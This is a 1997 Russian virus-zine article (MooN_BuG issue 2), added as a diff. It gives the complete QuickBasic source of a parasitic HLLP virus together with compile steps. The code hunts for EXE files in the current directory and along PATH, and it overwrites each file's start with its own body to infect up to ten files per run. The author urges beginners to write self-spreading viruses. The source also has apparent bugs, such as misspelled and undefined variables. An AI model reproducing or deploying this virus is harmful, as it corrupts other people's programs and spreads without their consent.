@@ -1,0 +1,338 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 2, May 1997                                           file 006
+
+
+                      ЭКЗОТИКА: ВИРУС-ПАРАЗИТ НА БЕЙСИКЕ
+                                                         by RedArc
+
+     При  написании  вируса на языке Бейсик программисты обычно сталкиваются с
+такими неразрешимыми проблемами, как
+ - нахождение имени и пути запущенной программы;
+ - обработка файлов в бинарном виде;
+ - обработка параметров из командной строки;
+ - размеры независимых исполняемых файлов.
+     Сталкнувшись  с  подобного  рода  проблемами  у  начинающих программистов
+надолго   пропадает   желание   написать  что-нибудь  живое  и  самостоятельно
+плодящееся.  Дык  это  не  правильно. Вирусы можно писать почти на всех языках
+программирования, только вот уровень и количество проблем будет разное.
+     Значит так, первая проблема решается тремя способами:
+ - сканирование экрана снизу вверх в поисках "забытого" имени файла (в
+   большинстве случаев получаем облом);
+ - юзание подпрограмки на языке ассемблера (см. ниже);
+ - использование "комбинированного" метода заражения (см. в след. разделах).
+     Со  второй  проблемой я вообще не увидел трудностей - просто нужно больше
+фантазии...  ;)  Для  решения  третьей  проблемы  нужно  всего-то покапаться в
+Help'е.  Ну  а на размеры вируса вообще нужно плюнуть... Главное - получилось!
+Ну в общем, кидаю ниже исходник полноценного HLLP-вируса, написанного на языке
+Microsoft  Quick Basic v.4.5, причем, отличается от подобного, опубликованного
+в   SU.VIRUS   тем,  что  "правильно"  определяет  имя  запущенной  программы,
+производит  поиск  по  каталогам  из PATH и имеет более умеренный аппетит, что
+сказывается на скорости его работы.
+     Короче  -  смотрите,  комментариев там с избытком. Компилировать исходник
+можно  так  (чего  там  компилятор  с линкером пишут - не помню, но количество
+нажатий  на  кнопочку  [Enter]  доведено  уже  до  автоматизма ;) ), только не
+забудьте поправить длину зверька в зависимости от EXE-паковщика:
+ bc.exe /E /X hllp_bas.bas [Enter]
+ [Enter]
+ [Enter]
+ link.exe hllp_bas.obj [Enter]
+ [Enter]
+ [Enter]
+ bcom45.lib [Enter]
+     Да,  совсем  забыл...  Для  запуска  вируса не нужно использовать никаких
+дополнительных  программ - в теле вируса можно указать путь и имя дроппера для
+отказа запуска псевдо программы-носителя (дроппера).
+     PS:  Блин,  пришлось  после  многолетнего перерыва вспоминать Бейсик, так
+что возможны ошибки, хотя я их и не заметил ;) Но работает очень тормозно ;)
+
+=== Cut ===
+'(****************************************************************************)
+'(*****              HLLP.Basic (c) 1997 by RedArc // [TAVC]             *****)
+'(*****    Поиск EXE-программ в текущем каталоге и по переменной PATH    *****)
+'(*****            Паразитирование на основном коде программы            *****)
+'(*****              MooN_BuG issue 2 // Вирусы-паразиты //              *****)
+'(****************************************************************************)
+
+'Общие переменные для подпрограмм
+        COMMON SHARED FileNameVir$, HOME$, CP$, NumInfect%
+'Сбор параметров из командной строки
+        DECLARE SUB Comline (NumArgs%, Args$(), MaxArgs%)
+'Лечение файлов
+        DECLARE SUB CureFile (F1$)
+'Инфицирование файлов
+        DECLARE SUB InfectFileCure (F$)
+'Поиск файлов в текущем каталоге
+        DECLARE SUB CurrentDir ()
+'Поиск жертв в текущем каталоге
+        DECLARE SUB ListFileCureDir ()
+'Поиск каталогов по переменной PATH
+        DECLARE SUB SearchFromPath ()
+'Определение каталога запуска программы-носителя
+        DECLARE SUB HOMEIN ()
+'Адрес подпрограммы обработки ошибок
+        ON ERROR GOTO 200
+
+'************************
+'*** Данные программы ***
+'************************
+
+'Заголовок EXE-программы
+    TYPE ExeHeaderRecord
+         Signature AS STRING * 2 'Шестнадцатиричное 4D5A или дес. 19802
+         PartPag   AS STRING * 2 'Число байтов в последнем блоке файла
+         PageCnt   AS STRING * 2 'Число блоков по 512 байт, включая заголовок
+         ReloCnt   AS STRING * 2 'Число настраиваемых элементов
+         HdrSize   AS STRING * 2 'Число 16-байтовых блоков в заголовке
+         MinHeap   AS STRING * 2 'Минимальное число параграфов после программы
+         MaxHeap   AS STRING * 2 'Переключатель загрузки в младшие или старшие адреса
+         ReloSS    AS STRING * 2 'Относительный адрес сегмента стека
+         ReloSP    AS STRING * 2 'Адрес, который загружается в регистр SP
+         CheckSum  AS STRING * 2 'Сумма всех слов в файле
+         EXEIP     AS STRING * 2 'Адрес, который загружается в регистр IP
+         ReloCS    AS STRING * 2 'Относительный адрес сегмента кода
+         ReloOfs   AS STRING * 2 'Смещение первого настраиваемого элемента
+         OVRNum    AS STRING * 2 'Номер оверлейного фрагмента
+    END TYPE
+
+'Переменная типа заголовка исполняемого файла
+        DIM SHARED ExeHeader AS ExeHeaderRecord
+'Массив параметров из командной строки
+        DIM ARGUM$(1 TO 15)
+'Длина кода вируса
+        CONST REDARCLEN = 36501
+'Размер низкоуровневой подпрограммы для работы со списком списков (db)
+        CONST nASMBYTES = 96
+
+        DEFINT A-Z
+
+'Массив низкоуровневого кода в словах (dw)
+        DIM AsmProg(1 TO (nASMBYTES / 2))
+
+AsmBytes:
+'    1     2     3     4     5     6     7     8     9     10    11    12    13    14    15    16
+DATA &H1E, &H06, &H50, &H53, &H51, &H56, &H57, &HB4, &H62, &HCD, &H21, &H8E, &HC3, &H26, &HA1, &H2C
+DATA &H00, &H8E, &HD8, &H8E, &HC0, &H33, &HF6, &H8A, &H04, &H8A, &H64, &H01, &H3A, &HE0, &H74, &H03
+DATA &H46, &HEB, &HF4, &H3D, &H00, &H00, &H74, &H03, &H46, &HEB, &HEC, &H46, &H56, &H83, &HC6, &H03
+DATA &H56, &HB9, &H01, &H00, &H8A, &H04, &H3C, &H00, &H74, &H04, &H46, &H41, &HEB, &HF6, &H5E, &H5F
+DATA &HF3, &HA4, &H87, &HF7, &H4E, &H33, &HC0, &H89, &H04, &HB8, &H00, &H01, &H83, &HC6, &H02, &H89
+DATA &H04, &H5F, &H5E, &H59, &H5B, &H58, &H07, &H1F, &HCA, &H02, &H00, &H00, &H00, &H00, &H00, &H00
+
+'***********************
+'*** Реализация кода ***
+'***********************
+
+'Программы еще не заражены
+NumInfect% = 0
+
+'Запомним путь к COMMAND.COM - он нам еще не раз пригодится
+        CP$ = ENVIRON$("COMSPEC")
+
+'*** Определение пути и имени программы-носителя
+        CALL HOMEIN
+'Ищем последний список в списке
+        I% = 1
+        DO WHILE ENVIRON$(I%) <> ""
+                I% = I% + 1
+        LOOP
+'Определяем указатель в памяти на низкоуровневую подпрограмму
+        P = VARPTR(AsmProg(1))
+'Создаем для нее отдельный параграф в памяти и запоминаем его сегмент
+        DEF SEG = VARSEG(AsmProg(1))
+'Копируем низкоуровневую подпрограмму в выделенный параграф
+        RESTORE AsmBytes
+        FOR K% = 0 TO nASMBYTES - 1
+                READ J%
+                POKE (P + K), J%
+        NEXT K%
+'Передаем ей управление
+        CALL ABSOLUTE(VARPTR(AsmProg(1)))
+'Восстанавливаем сегмент кода на себя и освобождаем память
+        DEF SEG
+'Читаем из списка списков имя программы-носителя
+        FileNameVir$ = ENVIRON$(I%)
+'*** Определение пути и имени программы-носителя
+
+'Если вирус запущен не из дроппера, то производим запуск на исполнение
+IF FileNameVir$ <> "C:\TEST\HLLP_BAS.EXE" THEN
+'*** Запуск на исполнение программы - носителя
+'Лечим программу-носитель
+        CALL CureFile(FileNameVir$)
+'Собираем параметры из командной строки в массив
+        CALL Comline(N%, ARGUM$(), 10)
+'Собираем параметры из массива в строку
+        PARAM$ = " "
+        FOR I = 1 TO N: PARAM$ = PARAM$ + " " + ARGUM$(I): NEXT I
+'Запускаем программу-носитель на исполнение со строкой параметров
+        SHELL FileNameVirCure$ + PARAM$
+'Восстанавливаем заражение
+        CALL InfectFileCure(FileNameVirCure$)
+'*** Запуск на исполнение программы - носителя
+END IF
+
+'*** Поиск жертв
+'Поиск жертв в текущем каталоге
+        CALL CurrentDir
+'Поиск жертв в каталогах из PATH
+        CALL SearchFromPath
+'*** Поиск жертв
+
+'Выход из вируса
+400
+SHELL (CP$ + " /c " + LEFT$(HOME$, 2))
+CHDIR (HOME$)
+END
+'Обработка ошибок времени выполнения вируса
+200
+RESUME NEXT
+
+DEFSNG A-Z
+SUB Comline (NumArgs%, Args$(), MaxArgs%) STATIC
+CONST TRUE = -1, False = 0
+   NumArgs = 0: In = False
+   Cl$ = COMMAND$
+   L = LEN(Cl$)
+   FOR I = 1 TO L
+      C$ = MID$(Cl$, I, 1)
+      IF (C$ <> " " AND C$ <> CHR$(9)) THEN
+         IF NOT In THEN
+            IF NumArgs = MaxArgs THEN EXIT FOR
+            NumArgs = NumArgs + 1
+            In = TRUE
+         END IF
+         Args$(NumArgs) = Args$(NumArgs) + C$
+      ELSE
+         In = False
+      END IF
+   NEXT I
+END SUB
+
+SUB CureFile (F1$)
+'Создаем файл с кодом вируса
+    OPEN F1$ FOR BINARY AS #1
+    OPEN "REDARC.VIR" FOR BINARY AS #2
+    FOR K = 1 TO RerArcLen
+        GET #1, K, B
+        PUT #2, K, B
+    NEXT K
+    RESET
+'Прибиваем код вируса в файле путем восстановления настоящего начала
+    OPEN F1$ FOR BINARY AS #1
+         L = LOF(1)
+         FOR K = 1 TO REDARCLEN
+             GET #1, L - REDARCLEN + K, B
+             PUT #1, K, B
+         NEXT K
+    CLOSE #1
+END SUB
+
+SUB CurrentDir
+
+'*** Производим поиск программ через command.com
+'Листаем каталог с перенаправлением стандартной области ввода/вывода
+SHELL CP$ + " /c dir *.* > BASIC.VIR"
+'Запускаем подпрограмму обработки полученного списка файлов
+CALL ListFileCureDir
+END SUB
+
+SUB HOMEIN
+'Определение текущего каталога
+SHELL CP$ + " /c truename > HOME$$$$.VIR"
+OPEN "HOME$$$$.VIR" FOR INPUT AS #5
+INPUT #5, HOME$
+INPUT #5, HOME$
+CLOSE #5
+KILL "HOME$$$$.VIR"
+END SUB
+
+SUB InfectFileCure (F$)
+'Переписываем код вируса в программу-носитель для восстановления заражения
+    OPEN F$ FOR BINARY AS #1
+    OPEN "REDARC.VIR" FOR BINARY AS #2
+         FOR K = 1 TO REDARCLEN
+             GET #2, K, B
+             PUT #1, K, B
+         NEXT K
+         RESET
+    KILL "REDARC.VIR"
+END SUB
+
+SUB ListFileCureDir
+'Ограничение по количеству инфицированных программ
+IF NumInfect% >= 10 THEN 350
+'Обработка списка файлов
+OPEN FileNameVir$ FOR BINARY AS #3
+OPEN "BASIC.VIR" FOR INPUT AS #1
+        FOR I = 1 TO 4
+            INPUT #1, B$
+        NEXT I
+        INPUT #1, A$
+        WHILE NOT EOF(1)
+              INPUT #1, A$
+              I = 1
+              WHILE MID$(A$, I, 1) <> " "
+                    I = I + 1
+              WEND
+              EXT$ = MID$(A$, 10, 3)
+              IF EXT$ = "   " THEN 300
+              IF EXT$ <> "EXE" THEN 300
+              NumInfect% = NumInfect% + 1
+              FileName$ = LEFT$(A$, I - 1) + "." + MID$(A$, 10, 3)
+              OPEN FileName$ FOR BINARY AS #2
+                   GET #2, 1, ExeHeader
+                   IF ExeHeader.Signature <> "MZ" THEN 100
+                   IF ExeHeader.CheckSum = "ЭЙ" THEN 100
+                   '-------------------------
+                   L = LOF(2)
+                   FOR K = 1 TO REDARCLEN
+                       GET #2, K, B!
+                       PUT #2, L + K, B!
+                   NEXT K
+                   FOR K = 1 TO REDARCLEN
+                       GET #3, K, B!
+                       PUT #2, K, B!
+                   NEXT K
+100           CLOSE #2
+300     WEND
+CLOSE #1
+CLOSE #3
+350
+KILL "BASIC.VIR"
+END SUB
+
+SUB SearchFromPath
+'Поиск жертв в каталогах из PATH
+A$ = ENVIRON$("PATH")
+S$ = ""
+I = 1
+   WHILE 2 = 2
+         IF I >= LEN(A$) + 1 THEN
+            IF S$ <> "" THEN
+               IF RIGHT$(S$, 1) = "\" THEN S$ = LEFT$(S$, LEN(A$) - 1)
+               IF LEFT$(S$, 1) <> LEFT$(HOME$, 1) THEN
+                  B$ = CP$ + " /c " + LEFT$(S$, 2)
+                  SHELL B$
+               END IF
+              CHDIR (S$)
+               CALL CurrentDir
+
+            END IF
+            GOTO 10
+         END IF
+         Ch$ = MID$(A$, I, 1)
+         I = I + 1
+         IF Ch$ <> ";" THEN
+            S$ = S$ + Ch$
+         ELSE
+            IF RIGHT$(S$, 1) = "\" THEN S$ = LEFT$(S$, LEN(A$) - 1)
+            IF LEFT$(S$, 1) <> LEFT$(HOME$, 1) THEN
+               B$ = CP$ + " /c " + LEFT$(S$, 2)
+               SHELL B$
+            END IF
+            CHDIR (S$)
+            CALL CurrentDir
+            S$ = ""
+         END IF
+   WEND
+10
+END SUB
+=== Cut ===
